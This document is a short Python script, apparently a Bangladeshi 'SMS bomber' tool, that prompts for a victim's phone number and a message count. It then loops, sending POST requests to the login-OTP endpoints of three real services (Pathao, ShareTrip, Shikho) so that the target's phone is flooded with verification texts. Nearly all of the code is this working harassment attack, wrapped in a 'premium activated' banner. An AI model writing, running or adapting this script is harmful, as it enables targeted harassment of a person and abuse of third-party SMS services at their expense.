import requests, os, time, uuid

def start():
    os.system('clear')
    print('          \033[1;32m██████  \033[1;31m████████ \033[1;32m██████  ')
    print('         ██    ██    ██    ██   ██ ')
    print('         ██    ██    ██    ██████  ')
    print('         ██    ██    ██    ██      ')
    print('          ██████     ██    ██      \033[0m')
    
    line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
    print(line)
    print('\033[1;34m| [✓] DEVELOPED BY :  MMALEK ISLAM          |')
    print('| [✓] TEAM         :  X-BOOM VIP TEAM       |')
    print('| [✓] TOOL STATUS  :  PREMIUM ACTIVATED     |')
    print('| [✓] GITHUB       :  mmalekislam788        |')
    print('| [✓] VERSION      :  VIP BYPASS 2026       |\033[0m')
    print(line)
    
    # এটি আপনার জন্য একদম ফ্রি প্রিমিয়াম কী
    print(f'\033[1;32m[❤️] STATUS: PREMIUM USER ACTIVATED [❤️]')
    print(f'[❤️] VALIDITY: LIFETIME (FREE FOR YOU) [❤️]\033[0m')
    print(line)

    target = input('\n\033[1;32m[+] TARGET NUMBER (017...): \033[0m')
    amount = int(input('\033[1;32m[+] SMS AMOUNT: \033[0m'))
    
    # পাওয়ারফুল এপিআই লিস্ট
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

    for i in range(1, amount + 1):
        try:
            # Pathao API
            requests.post("https://api-hermes.pathao.com/user/otp-send/login", json={"phone": "+88"+target}, headers=headers, timeout=5)
            # ShareTrip API
            requests.post("https://api.sharetrip.net/api/v1/otp/send", json={"mobileNumber": target, "type": "login"}, headers=headers, timeout=5)
            # Shikho API
            requests.post("https://api.shikho.com/api/v1/auth/send-otp", json={"phone": target, "type": "login"}, headers=headers, timeout=5)
            
            print(f'\033[1;32m[{i}] VIP SUCCESS SENT ==> {target}\033[0m')
        except:
            print(f'\033[1;31m[{i}] VIP FAILED SENT ==> {target}\033[0m')
        
        time.sleep(2) # দ্রুত পাঠানোর জন্য সময় কমানো হয়েছে

if __name__ == "__main__":
    start()
